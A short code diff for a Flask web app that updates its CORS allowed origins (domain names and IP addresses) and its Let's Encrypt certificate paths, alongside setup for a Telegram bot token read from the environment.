@@ -16,9 +16,9 @@ load_dotenv()
 
 # Initialize Flask app
 app = Flask(__name__)
-CORS(app, origins=["https://verify.wekopp45.com", "http://verify.wekopp45.com", 
-                  "http://185.113.249.149:3000", "http://185.113.249.149", 
-                  "https://185.113.249.149"])
+CORS(app, origins=["https://wekopp45.com", "http://wekopp45.com", 
+                  "http://185.113.249.47:3000", "http://185.113.249.47",
+                  "https://185.113.249.47"])
 
 # Get configuration from environment
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
@@ -300,8 +300,8 @@ if __name__ == '__main__':
     bot_thread.start()
 
     # SSL certificate paths
-    key_path = '/etc/letsencrypt/live/verify.wekopp45.com/privkey.pem'
-    cert_path = '/etc/letsencrypt/live/verify.wekopp45.com/fullchain.pem'
+    key_path = '/etc/letsencrypt/live/online.wekopp45.com/privkey.pem'
+    cert_path = '/etc/letsencrypt/live/online.wekopp45.com/fullchain.pem'
     
     # Run Flask app
     app.run(host='0.0.0.0', port=5000, ssl_context=(cert_path, key_path))
